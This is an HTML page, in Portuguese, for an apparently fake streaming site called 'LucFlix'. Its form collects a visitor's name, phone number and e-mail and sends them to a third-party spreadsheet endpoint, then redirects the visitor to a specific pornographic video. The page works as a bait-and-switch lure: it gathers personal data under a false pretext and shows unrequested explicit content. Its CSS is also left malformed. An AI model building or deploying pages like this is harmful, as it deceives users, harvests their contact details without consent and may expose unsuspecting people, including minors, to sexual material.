  <style> 
body {
    margin: 0;
    padding: 0;
    background-color: black;
    color: white;
    font-family: Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    overflow: hidden;
    background-image: linear-gradient(to bottom, rgba(0, 0, 0, 0.05), rgba(0, 0, 0, 1)), url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTsoW27BEP7k0jzuEdxh5g180KiUX3iXawrg&usqp=CAU');

}

header {
    background-color: black;
    text-align: center;

}
    .logo {
      font-size: 2em;
      font-weight: bold;
      letter-spacing: 2px;

    .container {
        max-width: 400px;

        background-color: #333; /* Tonalidade mais clara de preto */

    }

    form {
        width: 100%;
    }

    label {
        display: block;
        margin-bottom: 8px;

    }

    input {
        width: 100%;

        margin-bottom: 16px;
    }

</style>
</head>
<body>
<header>
  <div class="logo">LucFlix</div>
    <h2>Filmes e SÃ©ries</h2>
</header>
    <div>
        <form id="myForm">
            <label for="name">Nome:</label>
            <input type="text" id="name" name="name" required>

            <label for="phone">Telefone:</label>
            <input type="tel" id="phone" name="phone" required>

            <label for="email">E-mail:</label>
            <input type="email" id="email" name="email" required>

            <button type="button" onclick="submitForm()">Enviar</button>
        </form>
    </div>

<script>
    function submitForm() {
        const form = document.getElementById('myForm');
        const formData = new FormData(form);

        fetch('https://api.sheetmonkey.io/form/jHPbPNfHKot1hTdGLyaay4', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erro ao enviar dados para a API');
            }
            alert('Dados enviados com sucesso!');
            window.location.href = 'https://www.xvideos.com/video54257265/gordo_botando_pra_quebrar'; // Substitua pelo seu link de redirecionamento //xvideos.com
        })
        .catch(error => {
            console.error('Erro:', error.message);
            alert('Erro ao enviar dados. Por favor, tente novamente.');
        });
    }
</script>
</body>
